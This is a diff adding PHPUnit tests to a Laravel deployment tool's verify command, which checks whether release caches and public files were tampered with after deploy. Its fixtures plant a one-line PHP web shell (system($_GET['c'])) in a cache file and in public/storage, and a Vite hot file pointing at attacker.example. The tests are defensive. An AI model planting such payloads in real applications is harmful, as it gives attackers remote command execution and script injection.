@@ -71,6 +71,8 @@ class VerifyCommandTest extends TestCase
     {
         @mkdir($this->release.'/bootstrap/cache', 0777, true);
         file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php return [];');
+        // As a deploy does: optimize before the swap, then the record.
+        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
         @mkdir($this->release.'/storage/logs', 0777, true);
         file_put_contents($this->release.'/storage/logs/laravel.log', 'noise');
         file_put_contents($this->release.'/.env', 'APP_KEY=x');
@@ -131,6 +133,98 @@ class VerifyCommandTest extends TestCase
         $this->artisan('slipstream:verify')->assertExitCode(1);
     }
 
+    /**
+     * The record of the caches sits in the release, as writable as the
+     * caches. The deployment row keeps its hash, so a record deleted or
+     * rewritten after the deploy is drift too.
+     */
+    public function test_a_cache_record_deleted_or_rewritten_after_the_deploy_is_drift(): void
+    {
+        @mkdir($this->release.'/bootstrap/cache', 0777, true);
+        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php return [];');
+        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
+        \Slipstream\Models\Deployment::query()->create([
+            'server_name' => 'test-node', 'sha' => $this->fixture->sha, 'branch' => 'production', 'trigger' => \Slipstream\Models\Deployment::TRIGGER_POLL,
+            'status' => \Slipstream\Models\Deployment::STATUS_DEPLOYED, 'release_path' => $this->release,
+            'meta' => ['artifact' => ['baseline_sha256' => hash_file('sha256', $this->release.'/.slipstream/generated.json')]],
+        ]);
+        $this->artisan('slipstream:verify')->assertExitCode(0);
+
+        // Tampered, and the record rewritten to match.
+        file_put_contents($this->release.'/bootstrap/cache/config.php', '<?php system($_GET["c"]); return [];');
+        file_put_contents($this->release.'/.slipstream/generated.json', Baseline::toJson(Baseline::record($this->release)));
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('the recorded hashes were rewritten after the deploy')
+            ->assertExitCode(1);
+
+        unlink($this->release.'/.slipstream/generated.json');
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('the hashes recorded at deploy are gone')
+            ->assertExitCode(1);
+    }
+
+    public function test_a_planted_vite_hot_file_or_php_under_public_storage_is_drift(): void
+    {
+        // Vite loads every script from the URL in public/hot.
+        file_put_contents($this->release.'/public/hot', 'https://attacker.example');
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('public/hot')
+            ->assertExitCode(1);
+        unlink($this->release.'/public/hot');
+
+        // public/storage is the node's, but only as a link into storage.
+        mkdir($this->release.'/public/storage');
+        file_put_contents($this->release.'/public/storage/x.php', '<?php system($_GET["c"]);');
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('public/storage/x.php')
+            ->assertExitCode(1);
+    }
+
+    public function test_a_release_signed_with_the_old_defaults_still_does_not_excuse_public_hot(): void
+    {
+        // 0.6.1's publish signed these three into every manifest.
+        $this->fixture->republishManifest(function (array $manifest): array {
+            $manifest['generated'] = ['bootstrap/cache', 'public/storage', 'public/hot'];
+
+            return $manifest;
+        });
+        $release = $this->fixture->unpackInto($this->fixture->appRoot.'/old-defaults');
+        file_put_contents($release.'/public/hot', 'https://attacker.example');
+
+        $this->artisan('slipstream:verify', ['--release' => $release])
+            ->expectsOutputToContain('public/hot')
+            ->assertExitCode(1);
+    }
+
+    public function test_public_storage_may_be_a_link_into_the_shared_storage_and_nowhere_else(): void
+    {
+        if (DIRECTORY_SEPARATOR === '\\') {
+            $this->markTestSkipped('needs symlinks.');
+        }
+
+        mkdir($this->fixture->appRoot.'/storage/app/public', 0777, true);
+        $this->removeTree($this->release.'/storage');
+        symlink($this->fixture->appRoot.'/storage', $this->release.'/storage');
+        symlink($this->release.'/storage/app/public', $this->release.'/public/storage');
+        $this->artisan('slipstream:verify')->assertExitCode(0);
+
+        unlink($this->release.'/public/storage');
+        mkdir($this->fixture->appRoot.'/elsewhere');
+        symlink($this->fixture->appRoot.'/elsewhere', $this->release.'/public/storage');
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('public/storage')
+            ->assertExitCode(1);
+    }
+
+    public function test_without_the_release_environment_a_statement_cannot_be_checked(): void
+    {
+        config()->set('slipstream.release.environment', null);
+
+        $this->artisan('slipstream:verify')
+            ->expectsOutputToContain('SLIPSTREAM_RELEASE_ENVIRONMENT is not set')
+            ->assertExitCode(1);
+    }
+
     public function test_the_release_config_cannot_hide_a_signed_file(): void
     {
         // config/slipstream.php ships inside the archive: it is the build's word.
@@ -161,6 +255,8 @@ class VerifyCommandTest extends TestCase
 
     public function test_the_generated_caches_are_compared_with_the_hashes_recorded_at_deploy(): void
     {
+        // A release deployed before 0.6.1, with no deployment row saying otherwise.
+        unlink($this->release.'/.slipstream/generated.json');
         $this->artisan('slipstream:verify')
             ->expectsOutputToContain('no hashes recorded')
             ->assertExitCode(0);
